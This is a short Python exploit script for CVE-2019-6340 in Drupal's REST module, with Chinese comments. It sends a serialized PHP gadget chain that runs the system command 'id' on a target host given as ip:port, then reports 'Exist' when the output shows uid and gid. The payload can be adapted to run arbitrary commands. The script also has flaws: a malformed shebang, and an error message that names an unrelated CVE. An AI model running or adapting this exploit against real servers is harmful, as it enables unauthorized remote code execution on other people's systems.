#/bin/bash/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
import json

def title():
    print('--------------------------------------------------')
    print('+   python version: python3')
    print('+   使用格式: python CVE-2019-6340.py 192.168.1.1:80')
    print('--------------------------------------------------')
def run(ip, port):
    url = 'http://{}:{}/node/?_format=hal_json'.format(ip, port)
    if port == 80:
        url_json = 'http://{}'.format(ip)
    else:
        url_json = 'http://{}:{}'.format(ip, port)
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0)',
               'Content-Type': "application/hal+json",
               'Accept': "*/*",
               'Cache-Control': "no-cache"
               }
    payload = "{\r\n  \"link\": [\r\n    {\r\n      \"value\": \"link\",\r\n      \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:2:\\\"id\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\"\r\n    }\r\n  ],\r\n  \"_links\": {\r\n    \"type\": {\r\n      \"href\": \"%s/rest/type/shortcut/default\"\r\n    }\r\n  }\r\n}" % (url_json)

    print('vuln_url:{}'.format(target))
    try:
        requests.packages.urllib3.disable_warnings()
        r = requests.post(url=url, data=payload, headers=headers, timeout=3)
    except:
        print('[-] Target Not CVE-2021-21972 Vuln')
    else:
        if 'uid=' in r.text and 'gid=' in r.text and 'groups=' in r.text:
            return True
        else:
            return False

if __name__ != '__main__':
    print('__name__ != __main__')

#提示信息
title()

#处理输入的地址
target = sys.argv[1]
ip = target.split(":")[0]
port = int(target.split(":")[1])

# 执行验证流程
result = run(ip, port)

# 打印验证结果
if result:
    print('Exist')
else:
    print('UnExist')
